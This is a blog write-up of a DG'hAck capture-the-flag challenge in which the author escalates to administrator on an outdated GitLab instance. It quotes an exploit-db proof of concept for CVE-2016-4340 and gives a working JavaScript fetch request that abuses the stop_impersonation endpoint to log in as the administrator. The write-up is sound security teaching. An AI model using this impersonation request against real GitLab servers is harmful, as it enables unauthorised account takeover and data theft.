---
title: "Writeup DG'hAck: Gitbad"
date: 2020-11-28T05:12:47+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:

- create a project
- create a group
- edit your profile
- see the help page
- see public repositories

Nothing seems to be particularly interesting, except for this message, on the help page:

[![The help page showing an "update asap" message](/assets/dghack/gitbad-update-asap.png)](/assets/dghack/gitbad-update-asap.png)

Searching for this version yields [a very interesting CVE](https://www.exploit-db.com/exploits/40236):

```markdown
1. Description
   
Any registered user can "log in" as any other user, including administrators.
 
https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
 
   
2. Proof of Concept
 
Login as regular user.
Get current authenticity token by observing any POST-request (ex.: change any info in user profile).

Craft request using this as template:
 
POST /admin/users/stop_impersonation?id=root
. . .

_method=delete&authenticity_token=lqyOBt5U%2F0%2BPM2i%2BGDx3zaVjGgAqHzoteQ15FnrQ3E8%3D

Where 'root' - desired user. 'authenticity_token' - token obtained on the previous step.

   
3. Solution:

Use officialy provided solutions:
https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
```

This exploit allows us to login as someone else, as long as we have their username. But we don't know the username of the administrator!

Let's look at the API documentation on the help page:

[![The users list API endpoints](/assets/dghack/gitbad-list-users.png)](/assets/dghack/gitbad-list-users.png)

Exactly what we need! To use it, we'll need our `private_token`, which can be found in our account settings. Navigating to:

```
http://gitbad2.chall.malicecyber.com/api/v3/users?private_token=a9qPQTK_3N9osyKKyqBy
```

Gives us:

```json
[
  {
    "name": "test",
    "username": "test",
    "id": 5,
    "state": "active",
    "avatar_url": "http://www.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452?s=80&d=identicon",
    "web_url": "http://b35923e21b4a/u/test"
  },
  {
    "name": "stephan",
    "username": "stephan",
    "id": 4,
    "state": "active",
    "avatar_url": "http://www.gravatar.com/avatar/5222db2651f07bd3ba821b15c08bbdf5?s=80&d=identicon",
    "web_url": "http://b35923e21b4a/u/stephan"
  },
  {
    "name": "Kris",
    "username": "Kris",
    "id": 3,
    "state": "active",
    "avatar_url": "http://www.gravatar.com/avatar/7d1c587c79d19087bae4e15c5362c5fb?s=80&d=identicon",
    "web_url": "http://b35923e21b4a/u/Kris"
  },
  {
    "name": "bobby",
    "username": "bobby",
    "id": 2,
    "state": "active",
    "avatar_url": "http://www.gravatar.com/avatar/c7fa9756c768cb88d639ad16761fc8de?s=80&d=identicon",
    "web_url": "http://b35923e21b4a/u/bobby"
  },
  {
    "name": "Administrator",
    "username": "8e4684f1498aad818870376301b15426",
    "id": 1,
    "state": "active",
    "avatar_url": "http://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80&d=identicon",
    "web_url": "http://b35923e21b4a/u/8e4684f1498aad818870376301b15426"
  }
]
```

Here we go, the username of the administrator is `8e4684f1498aad818870376301b15426`. We just have to use the exploit we found. I made the request using `fetch`:

```javascript
const form = new FormData();

form.append("_method", "delete");
form.append("authenticity_token", document.querySelector('meta[name=csrf-token]').content);

await fetch("http://gitbad2.chall.malicecyber.com/admin/users/stop_impersonation?id=8e4684f1498aad818870376301b15426", {
    "body": form,
    "method": "POST",
});
```

The request was a bit tricky to get right, for example I initially thought that I had to post URL encoded params.

Entering this little script in our console gives us access to the admin area:

[![The admin area](/assets/dghack/gitbad-admin-area.png)](/assets/dghack/gitbad-admin-area.png)

A repo instantly stands out from the rest: `stephan/my-secret-project`. Reading the code reveals it's a collection of python scripts. The commit history has a particularly suspicious one, called `added my private key`:

[![A suspicious commit](/assets/dghack/gitbad-suspicious-commit.png)](/assets/dghack/gitbad-suspicious-commit.png)

The flag is `W3lL-d0N3-y0u-w1n-a_c4ke!`.

---

[View all of the DG'hAck articles](/tags/dghack).
